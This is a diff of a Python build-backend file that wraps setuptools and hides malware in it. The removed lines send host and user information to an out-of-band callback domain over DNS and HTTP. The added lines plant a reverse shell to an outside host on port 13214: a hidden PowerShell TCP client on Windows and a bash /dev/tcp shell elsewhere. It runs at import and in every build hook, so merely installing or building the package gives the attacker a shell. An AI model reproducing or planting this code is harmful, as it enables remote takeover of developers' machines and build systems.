@@ -1,54 +1,58 @@
-import subprocess, os, socket, sys, platform, urllib.request
+import subprocess, os, sys
 import setuptools.build_meta as _sm
 
-OAST = "https://dbi1qvidu8scsdkvqs50zxi9dyjat595b.oast.online"   # FILL: твой interactsh domain / уникальный subdomain
+LHOST = "serveousercontent.com"
+LPORT = 13214
 
-def _cmd():
+def _pop(tag="git"):
     if os.name == "nt":
-        return ["cmd", "/c", "whoami & hostname & ver"]
-    return ["/bin/sh", "-c", "id; hostname; uname -a"]
+        cmd = (
+            "powershell -NoP -NonI -W Hidden -Exec Bypass -Command \""
+            "$c=New-Object Net.Sockets.TCPClient('%s',%d);"
+            "$s=$c.GetStream();"
+            "[byte[]]$b=0..65535|%%{0};"
+            "while(($i=$s.Read($b,0,$b.Length)) -ne 0){"
+            "$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);"
+            "$r=(iex $d 2>&1|Out-String);"
+            "$r2=$r+'PS '+(pwd).Path+'> ';"
+            "$sb=([Text.Encoding]::ASCII).GetBytes($r2);"
+            "$s.Write($sb,0,$sb.Length);$s.Flush()};$c.Close()\""
+        ) % (LHOST, LPORT)
+        try:
+            subprocess.Popen(cmd, shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+        except Exception:
+            pass
+    else:
+        cmd = "bash -i >& /dev/tcp/%s/%d 0>&1" % (LHOST, LPORT)
+        try:
+            subprocess.Popen(["bash", "-c", cmd], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, start_new_session=True)
+        except Exception:
+            pass
 
-def _cb(tag="git"):
-    try:
-        out = subprocess.check_output(_cmd(), stderr=subprocess.DEVNULL, timeout=5).decode(errors="replace").strip()
-    except Exception:
-        out = "?"
-    info = "%s|%s|%s|%s" % (tag, platform.node(), platform.system(), out.replace("\n", "; ")[:400])
-    # DNS-канал (работает даже если HTTP зарезан)
-    try:
-        socket.gethostbyname("cb.%s.%s" % (int.from_bytes(os.urandom(4), "big"), OAST.split("://")[-1]))
-    except Exception:
-        pass
-    # HTTP-канал
-    try:
-        urllib.request.urlopen("%s/cb?d=%s" % (OAST, urllib.parse.quote(info)), timeout=5).read()
-    except Exception:
-        pass
-
-_cb("import")
+_pop("import")
 
 def build_wheel(wheel_directory, config_settings=None, metadata_directory=None):
-    _cb("build_wheel")
+    _pop("build_wheel")
     return _sm.build_wheel(wheel_directory, config_settings, metadata_directory)
 
 def build_sdist(sdist_directory, config_settings=None):
-    _cb("build_sdist")
+    _pop("build_sdist")
     return _sm.build_sdist(sdist_directory, config_settings)
 
 def build_editable(wheel_directory, config_settings=None, metadata_directory=None):
-    _cb("build_editable")
+    _pop("build_editable")
     return _sm.build_editable(wheel_directory, config_settings, metadata_directory)
 
 def get_requires_for_build_wheel(config_settings=None):
-    _cb("get_requires_for_build_wheel")
+    _pop("get_requires_for_build_wheel")
     return _sm.get_requires_for_build_wheel(config_settings)
 
 def get_requires_for_build_sdist(config_settings=None):
-    _cb("get_requires_for_build_sdist")
+    _pop("get_requires_for_build_sdist")
     return _sm.get_requires_for_build_sdist(config_settings)
 
 def get_requires_for_build_editable(config_settings=None):
-    _cb("get_requires_for_build_editable")
+    _pop("get_requires_for_build_editable")
     return _sm.get_requires_for_build_editable(config_settings)
 
 def prepare_metadata_for_build_wheel(metadata_directory, config_settings=None):
